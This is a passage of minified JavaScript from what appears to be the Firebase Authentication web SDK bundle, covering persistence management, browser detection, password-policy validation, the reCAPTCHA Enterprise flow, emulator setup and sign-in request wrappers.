 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class h2{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,t){this.storage[e]=t}async _get(e){const t=this.storage[e];return t===void 0?null:t}async _remove(e){delete this.storage[e]}_addListener(e,t){}_removeListener(e,t){}}h2.type="NONE";const oI=h2;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Mf(n,e,t){return`firebase:${n}:${e}:${t}`}class ml{constructor(e,t,r){this.persistence=e,this.auth=t,this.userKey=r;const{config:i,name:s}=this.auth;this.fullUserKey=Mf(this.userKey,i.apiKey,s),this.fullPersistenceKey=Mf("persistence",i.apiKey,s),this.boundEventHandler=t._onStorageEvent.bind(t),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);if(!e)return null;if(typeof e=="string"){const t=await Cd(this.auth,{idToken:e}).catch(()=>{});return t?oi._fromGetAccountInfoResponse(this.auth,t,e):null}return oi._fromJSON(this.auth,e)}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const t=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,t)return this.setCurrentUser(t)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,t,r="authUser"){if(!t.length)return new ml(Xi(oI),e,r);const i=(await Promise.all(t.map(async u=>{if(await u._isAvailable())return u}))).filter(u=>u);let s=i[0]||Xi(oI);const o=Mf(r,e.config.apiKey,e.name);let a=null;for(const u of t)try{const h=await u._get(o);if(h){let f;if(typeof h=="string"){const m=await Cd(e,{idToken:h}).catch(()=>{});if(!m)break;f=await oi._fromGetAccountInfoResponse(e,m,h)}else f=oi._fromJSON(e,h);u!==s&&(a=f),s=u;break}}catch{}const l=i.filter(u=>u._shouldAllowMigration);return!s._shouldAllowMigration||!l.length?new ml(s,e,r):(s=l[0],a&&await s._set(o,a.toJSON()),await Promise.all(t.map(async u=>{if(u!==s)try{await u._remove(o)}catch{}})),new ml(s,e,r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function aI(n){const e=n.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(g2(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(f2(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(y2(e))return"Blackberry";if(w2(e))return"Webos";if(d2(e))return"Safari";if((e.includes("chrome/")||p2(e))&&!e.includes("edge/"))return"Chrome";if(m2(e))return"Android";{const t=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,r=n.match(t);if((r==null?void 0:r.length)===2)return r[1]}return"Other"}function f2(n=nr()){return/firefox\//i.test(n)}function d2(n=nr()){const e=n.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function p2(n=nr()){return/crios\//i.test(n)}function g2(n=nr()){return/iemobile/i.test(n)}function m2(n=nr()){return/android/i.test(n)}function y2(n=nr()){return/blackberry/i.test(n)}function w2(n=nr()){return/webos/i.test(n)}function mv(n=nr()){return/iphone|ipad|ipod/i.test(n)||/macintosh/i.test(n)&&/mobile/i.test(n)}function t8(n=nr()){var e;return mv(n)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function n8(){return m5()&&document.documentMode===10}function v2(n=nr()){return mv(n)||m2(n)||w2(n)||y2(n)||/windows phone/i.test(n)||g2(n)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _2(n,e=[]){let t;switch(n){case"Browser":t=aI(nr());break;case"Worker":t=`${aI(nr())}-${n}`;break;default:t=n}const r=e.length?e.join(","):"FirebaseCore-web";return`${t}/JsCore/${ec}/${r}`}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class r8{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,t){const r=s=>new Promise((o,a)=>{try{const l=e(s);o(l)}catch(l){a(l)}});r.onAbort=t,this.queue.push(r);const i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const t=[];try{for(const r of this.queue)await r(e),r.onAbort&&t.push(r.onAbort)}catch(r){t.reverse();for(const i of t)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:r==null?void 0:r.message})}}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function i8(n,e={}){return vo(n,"GET","/v2/passwordPolicy",wa(n,e))}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const s8=6;class o8{constructor(e){var t,r,i,s;const o=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(t=o.minPasswordLength)!==null&&t!==void 0?t:s8,o.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=o.maxPasswordLength),o.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=o.containsLowercaseCharacter),o.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=o.containsUppercaseCharacter),o.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=o.containsNumericCharacter),o.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=o.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(i=(r=e.allowedNonAlphanumericCharacters)===null||r===void 0?void 0:r.join(""))!==null&&i!==void 0?i:"",this.forceUpgradeOnSignin=(s=e.forceUpgradeOnSignin)!==null&&s!==void 0?s:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var t,r,i,s,o,a;const l={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,l),this.validatePasswordCharacterOptions(e,l),l.isValid&&(l.isValid=(t=l.meetsMinPasswordLength)!==null&&t!==void 0?t:!0),l.isValid&&(l.isValid=(r=l.meetsMaxPasswordLength)!==null&&r!==void 0?r:!0),l.isValid&&(l.isValid=(i=l.containsLowercaseLetter)!==null&&i!==void 0?i:!0),l.isValid&&(l.isValid=(s=l.containsUppercaseLetter)!==null&&s!==void 0?s:!0),l.isValid&&(l.isValid=(o=l.containsNumericCharacter)!==null&&o!==void 0?o:!0),l.isValid&&(l.isValid=(a=l.containsNonAlphanumericCharacter)!==null&&a!==void 0?a:!0),l}validatePasswordLengthOptions(e,t){const r=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;r&&(t.meetsMinPasswordLength=e.length>=r),i&&(t.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,t){this.updatePasswordCharacterOptionsStatuses(t,!1,!1,!1,!1);let r;for(let i=0;i<e.length;i++)r=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(t,r>="a"&&r<="z",r>="A"&&r<="Z",r>="0"&&r<="9",this.allowedNonAlphanumericCharacters.includes(r))}updatePasswordCharacterOptionsStatuses(e,t,r,i,s){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=t)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=r)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class a8{constructor(e,t,r,i){this.app=e,this.heartbeatServiceProvider=t,this.appCheckServiceProvider=r,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new lI(this),this.idTokenSubscription=new lI(this),this.beforeStateQueue=new r8(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=s2,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this._resolvePersistenceManagerAvailable=void 0,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion,this._persistenceManagerAvailable=new Promise(s=>this._resolvePersistenceManagerAvailable=s)}_initializeWithPersistence(e,t){return t&&(this._popupRedirectResolver=Xi(t)),this._initializationPromise=this.queue(async()=>{var r,i,s;if(!this._deleted&&(this.persistenceManager=await ml.create(this,e),(r=this._resolvePersistenceManagerAvailable)===null||r===void 0||r.call(this),!this._deleted)){if(!((i=this._popupRedirectResolver)===null||i===void 0)&&i._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(t),this.lastNotifiedUid=((s=this.currentUser)===null||s===void 0?void 0:s.uid)||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const t=await Cd(this,{idToken:e}),r=await oi._fromGetAccountInfoResponse(this,t,e);await this.directlySetCurrentUser(r)}catch(t){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",t),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){var t;if(ii(this.app)){const o=this.app.settings.authIdToken;return o?new Promise(a=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(o).then(a,a))}):this.directlySetCurrentUser(null)}const r=await this.assertedPersistence.getCurrentUser();let i=r,s=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const o=(t=this.redirectUser)===null||t===void 0?void 0:t._redirectEventId,a=i==null?void 0:i._redirectEventId,l=await this.tryRedirectSignIn(e);(!o||o===a)&&(l!=null&&l.user)&&(i=l.user,s=!0)}if(!i)return this.directlySetCurrentUser(null);if(!i._redirectEventId){if(s)try{await this.beforeStateQueue.runMiddleware(i)}catch(o){i=r,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(o))}return i?this.reloadAndSetCurrentUserOrClear(i):this.directlySetCurrentUser(null)}return Re(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===i._redirectEventId?this.directlySetCurrentUser(i):this.reloadAndSetCurrentUserOrClear(i)}async tryRedirectSignIn(e){let t=null;try{t=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return t}async reloadAndSetCurrentUserOrClear(e){try{await Rd(e)}catch(t){if((t==null?void 0:t.code)!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=jU()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(ii(this.app))return Promise.reject(ro(this));const t=e?bn(e):null;return t&&Re(t.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(t&&t._clone(this))}async _updateCurrentUser(e,t=!1){if(!this._deleted)return e&&Re(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),t||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return ii(this.app)?Promise.reject(ro(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return ii(this.app)?Promise.reject(ro(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(Xi(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const t=this._getPasswordPolicyInternal();return t.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):t.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await i8(this),t=new o8(e);this.tenantId===null?this._projectPasswordPolicy=t:this._tenantPasswordPolicies[this.tenantId]=t}_getPersistenceType(){return this.assertedPersistence.persistence.type}_getPersistence(){return this.assertedPersistence.persistence}_updateErrorMap(e){this._errorFactory=new lh("auth","Firebase",e())}onAuthStateChanged(e,t,r){return this.registerStateListener(this.authStateSubscription,e,t,r)}beforeAuthStateChanged(e,t){return this.beforeStateQueue.pushCallback(e,t)}onIdTokenChanged(e,t,r){return this.registerStateListener(this.idTokenSubscription,e,t,r)}authStateReady(){return new Promise((e,t)=>{if(this.currentUser)e();else{const r=this.onAuthStateChanged(()=>{r(),e()},t)}})}async revokeAccessToken(e){if(this.currentUser){const t=await this.currentUser.getIdToken(),r={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:t};this.tenantId!=null&&(r.tenantId=this.tenantId),await e8(this,r)}}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}async _setRedirectUser(e,t){const r=await this.getOrInitRedirectPersistenceManager(t);return e===null?r.removeCurrentUser():r.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const t=e&&Xi(e)||this._popupRedirectResolver;Re(t,this,"argument-error"),this.redirectPersistenceManager=await ml.create(this,[Xi(t._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var t,r;return this._isInitialized&&await this.queue(async()=>{}),((t=this._currentUser)===null||t===void 0?void 0:t._redirectEventId)===e?this._currentUser:((r=this.redirectUser)===null||r===void 0?void 0:r._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,t;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const r=(t=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&t!==void 0?t:null;this.lastNotifiedUid!==r&&(this.lastNotifiedUid=r,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,t,r,i){if(this._deleted)return()=>{};const s=typeof t=="function"?t:t.next.bind(t);let o=!1;const a=this._isInitialized?Promise.resolve():this._initializationPromise;if(Re(a,this,"internal-error"),a.then(()=>{o||s(this.currentUser)}),typeof t=="function"){const l=e.addObserver(t,r,i);return()=>{o=!0,l()}}else{const l=e.addObserver(t);return()=>{o=!0,l()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return Re(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=_2(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;const t={"X-Client-Version":this.clientVersion};this.app.options.appId&&(t["X-Firebase-gmpid"]=this.app.options.appId);const r=await((e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader());r&&(t["X-Firebase-Client"]=r);const i=await this._getAppCheckToken();return i&&(t["X-Firebase-AppCheck"]=i),t}async _getAppCheckToken(){var e;if(ii(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const t=await((e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken());return t!=null&&t.error&&OU(`Error while retrieving App Check token: ${t.error}`),t==null?void 0:t.token}}function tc(n){return bn(n)}class lI{constructor(e){this.auth=e,this.observer=null,this.addObserver=T5(t=>this.observer=t)}get next(){return Re(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Up={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function l8(n){Up=n}function E2(n){return Up.loadJS(n)}function c8(){return Up.recaptchaEnterpriseScript}function u8(){return Up.gapiScript}function h8(n){return`__${n}${Math.floor(Math.random()*1e6)}`}class f8{constructor(){this.enterprise=new d8}ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}class d8{ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}const p8="recaptcha-enterprise",I2="NO_RECAPTCHA";class g8{constructor(e){this.type=p8,this.auth=tc(e)}async verify(e="verify",t=!1){async function r(s){if(!t){if(s.tenantId==null&&s._agentRecaptchaConfig!=null)return s._agentRecaptchaConfig.siteKey;if(s.tenantId!=null&&s._tenantRecaptchaConfigs[s.tenantId]!==void 0)return s._tenantRecaptchaConfigs[s.tenantId].siteKey}return new Promise(async(o,a)=>{qU(s,{clientType:"CLIENT_TYPE_WEB",version:"RECAPTCHA_ENTERPRISE"}).then(l=>{if(l.recaptchaKey===void 0)a(new Error("recaptcha Enterprise site key undefined"));else{const u=new HU(l);return s.tenantId==null?s._agentRecaptchaConfig=u:s._tenantRecaptchaConfigs[s.tenantId]=u,o(u.siteKey)}}).catch(l=>{a(l)})})}function i(s,o,a){const l=window.grecaptcha;rI(l)?l.enterprise.ready(()=>{l.enterprise.execute(s,{action:e}).then(u=>{o(u)}).catch(()=>{o(I2)})}):a(Error("No reCAPTCHA enterprise script loaded."))}return this.auth.settings.appVerificationDisabledForTesting?new f8().execute("siteKey",{action:"verify"}):new Promise((s,o)=>{r(this.auth).then(a=>{if(!t&&rI(window.grecaptcha))i(a,s,o);else{if(typeof window>"u"){o(new Error("RecaptchaVerifier is only supported in browser"));return}let l=c8();l.length!==0&&(l+=a),E2(l).then(()=>{i(a,s,o)}).catch(u=>{o(u)})}}).catch(a=>{o(a)})})}}async function Pc(n,e,t,r=!1,i=!1){const s=new g8(n);let o;if(i)o=I2;else try{o=await s.verify(t)}catch{o=await s.verify(t,!0)}const a=Object.assign({},e);if(t==="mfaSmsEnrollment"||t==="mfaSmsSignIn"){if("phoneEnrollmentInfo"in a){const l=a.phoneEnrollmentInfo.phoneNumber,u=a.phoneEnrollmentInfo.recaptchaToken;Object.assign(a,{phoneEnrollmentInfo:{phoneNumber:l,recaptchaToken:u,captchaResponse:o,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}else if("phoneSignInInfo"in a){const l=a.phoneSignInInfo.recaptchaToken;Object.assign(a,{phoneSignInInfo:{recaptchaToken:l,captchaResponse:o,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}return a}return r?Object.assign(a,{captchaResp:o}):Object.assign(a,{captchaResponse:o}),Object.assign(a,{clientType:"CLIENT_TYPE_WEB"}),Object.assign(a,{recaptchaVersion:"RECAPTCHA_ENTERPRISE"}),a}async function cI(n,e,t,r,i){var s,o;if(i==="EMAIL_PASSWORD_PROVIDER")if(!((s=n._getRecaptchaConfig())===null||s===void 0)&&s.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")){const a=await Pc(n,e,t,t==="getOobCode");return r(n,a)}else return r(n,e).catch(async a=>{if(a.code==="auth/missing-recaptcha-token"){console.log(`${t} is protected by reCAPTCHA Enterprise for this project. Automatically triggering the reCAPTCHA flow and restarting the flow.`);const l=await Pc(n,e,t,t==="getOobCode");return r(n,l)}else return Promise.reject(a)});else if(i==="PHONE_PROVIDER")if(!((o=n._getRecaptchaConfig())===null||o===void 0)&&o.isProviderEnabled("PHONE_PROVIDER")){const a=await Pc(n,e,t);return r(n,a).catch(async l=>{var u;if(((u=n._getRecaptchaConfig())===null||u===void 0?void 0:u.getProviderEnforcementState("PHONE_PROVIDER"))==="AUDIT"&&(l.code==="auth/missing-recaptcha-token"||l.code==="auth/invalid-app-credential")){console.log(`Failed to verify with reCAPTCHA Enterprise. Automatically triggering the reCAPTCHA v2 flow to complete the ${t} flow.`);const h=await Pc(n,e,t,!1,!0);return r(n,h)}return Promise.reject(l)})}else{const a=await Pc(n,e,t,!1,!0);return r(n,a)}else return Promise.reject(i+" provider is not supported.")}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function m8(n,e){const t=hv(n,"auth");if(t.isInitialized()){const i=t.getImmediate(),s=t.getOptions();if(ia(s,e??{}))return i;pi(i,"already-initialized")}return t.initialize({options:e})}function y8(n,e){const t=(e==null?void 0:e.persistence)||[],r=(Array.isArray(t)?t:[t]).map(Xi);e!=null&&e.errorMap&&n._updateErrorMap(e.errorMap),n._initializeWithPersistence(r,e==null?void 0:e.popupRedirectResolver)}function w8(n,e,t){const r=tc(n);Re(/^https?:\/\//.test(e),r,"invalid-emulator-scheme");const i=!!(t!=null&&t.disableWarnings),s=S2(e),{host:o,port:a}=v8(e),l=a===null?"":`:${a}`,u={url:`${s}//${o}${l}/`},h=Object.freeze({host:o,port:a,protocol:s.replace(":",""),options:Object.freeze({disableWarnings:i})});if(!r._canInitEmulator){Re(r.config.emulator&&r.emulatorConfig,r,"emulator-config-failed"),Re(ia(u,r.config.emulator)&&ia(h,r.emulatorConfig),r,"emulator-config-failed");return}r.config.emulator=u,r.emulatorConfig=h,r.settings.appVerificationDisabledForTesting=!0,i||_8()}function S2(n){const e=n.indexOf(":");return e<0?"":n.substr(0,e+1)}function v8(n){const e=S2(n),t=/(\/\/)?([^?#/]+)/.exec(n.substr(e.length));if(!t)return{host:"",port:null};const r=t[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){const s=i[1];return{host:s,port:uI(r.substr(s.length+1))}}else{const[s,o]=r.split(":");return{host:s,port:uI(o)}}}function uI(n){if(!n)return null;const e=Number(n);return isNaN(e)?null:e}function _8(){function n(){const e=document.createElement("p"),t=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",t.position="fixed",t.width="100%",t.backgroundColor="#ffffff",t.border=".1em solid #000000",t.color="#b50000",t.bottom="0px",t.left="0px",t.margin="0px",t.zIndex="10000",t.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",n):n())}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yv{constructor(e,t){this.providerId=e,this.signInMethod=t}toJSON(){return Ji("not implemented")}_getIdTokenResponse(e){return Ji("not implemented")}_linkToIdToken(e,t){return Ji("not implemented")}_getReauthenticationResolver(e){return Ji("not implemented")}}async function E8(n,e){return vo(n,"POST","/v1/accounts:signUp",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function I8(n,e){return Bp(n,"POST","/v1/accounts:signInWithPassword",wa(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function S8(n,e){return Bp(n,"POST","/v1/accounts:signInWithEmailLink",wa(n,e))}async function T8(n,e){return Bp(n,"POST","/v1/accounts:signInWithEmailLink",wa(n,e))}/**
 * @license
